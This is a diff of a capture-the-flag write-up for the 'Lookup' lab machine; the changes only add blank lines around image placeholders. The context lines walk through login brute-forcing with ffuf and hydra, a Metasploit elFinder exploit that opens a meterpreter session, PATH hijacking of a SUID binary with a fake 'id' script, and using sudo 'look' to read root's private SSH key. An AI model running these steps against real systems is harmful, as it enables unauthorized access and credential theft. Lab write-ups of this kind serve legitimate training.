@@ -73,7 +73,9 @@ Now what i got as output was
     * PASS: random_pass
     * USER: random_user
 ```
+
 <ffuf_image>
+
 **so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
 ```
 ffuf -v  -u http://lookup.thm/login.php \
@@ -144,7 +146,9 @@ set the rhosts to files.lookup.thm by the command set RHOSTS files.lookup.thm
 set the lhost to tun0 by the command set LHOST tun0
 then enter the command run and hit enter. The exploit runs.
 But i got the error.
+
 <msf_error>
+
 so to resolving steps were : -
 Set the rhosts to room_ip by the command set RHOSTS <room_ip>
 Next set the vhost to files.lookup.thm by the command set VHOST files.lookup.thm
@@ -162,20 +166,28 @@ This will give us a fully tty bash shell.
  As we all know this truth about the file /etc/passwd :-- The /etc/passwd file is a text database of user accounts on a Linux/Unix system.
 
 When we did cat /etc/passwd. i got 
+
 <users_image>
+
 all entries follows this structure **username:password_placeholder:UID:GID:comment:home_directory:shell**
 In the result we can see all system users except 2 *root* and *think*.
 Now we have another user think whose uid & gid are 1000. It has also its home directory at /home/think lets gets in and see whats there.
+
 <Enter_think>
+
 see there is user.txt but we are currently logged in as www-data and that is owned by root and group think. so we can't read it for now.
 But when we saw the hidden files with la  -a flag we can see there is a .password file under /home/think/.
+
 <Password_think>
 
 Next we will search for SUID binaries as they can gave us root access.
+
 <SUID_binary>
 We can see a unusual binary named /usr/sbin/pwm
 When we execute this binary so it is trying to execute id and get the username out of it, if we could trick it to think that we are the user think we can see the content of /home/think/.passwords.
+
 <Execute Binary>
+
 If we are lucky enough that the binary is executing the command id without using the full path, we can add a modified script has the same name and append it’s path to the path variable. Lets try that
 To do This we will make a file at the location  /tmp with filename id
 To do so we need to first exit from shell and go the meterpreter session since meterpreter session doesn't have a option to create file.
@@ -183,7 +195,9 @@ So The current directory in which we opnened the msfconsole. we will create the 
 #!/bin/bash
 echo "uid=1001(think) gid=1001(think) groups=1001(think)"
 then we save it on our local disk and upload it with the meterpreter command **upload id**
+
 <Make_script>
+
 Since Chmod is supported by meterpreter we will gave this id file executable permission.
 Now make sure you are inside the tmp directory. Cuz we are going to executing a command that will add the current directory to the varible $PATH.
 if you followed by steps and switched from meterpreter to shell i am pretty sure you are at the directory /var/www/files.lookup.thm/public_html/elFinder/php. switch to /tmp
@@ -199,19 +213,25 @@ Now we are going to bruteforce the user think with the wordlist by the command
  hydra -l think -P /path/to/wordlist  -t 4 ssh://room_ip
 ```
 After running you will get the ssh pass login using the ssh pass
+
 <ssh_login>
+
 Do enumuration there and you will got user flag.
 
 # SUDO privilage - Part-3
 
 Checking the sudo privileges for the think user by the command *sudo -l*, we can see that we are able to run the look binary as root.
+
 <look_binary>
+
 The look binary is similar to grep in that its primary purpose is to search for lines in a file that begin with a specified string. If it finds any lines that start with the given string, it prints them.
 
 We can leverage this behavior to read arbitrary files by specifying an empty string as the search term. Since every line begins with an empty string, all lines in the file will match, causing the entire file to be printed. This technique is also documented on GTFOBins.
 
 Using this method, we can successfully read the private SSH key of the root user as follows:
+
 <key_>
+
 After getting the key save the key as filename key and gave him chmod 600 permission by the command **chmod 600 key**
 Now login as root by the command ssh -i <filename of key> root@<ip>
 Now enumurate there and you will get the root flag too.
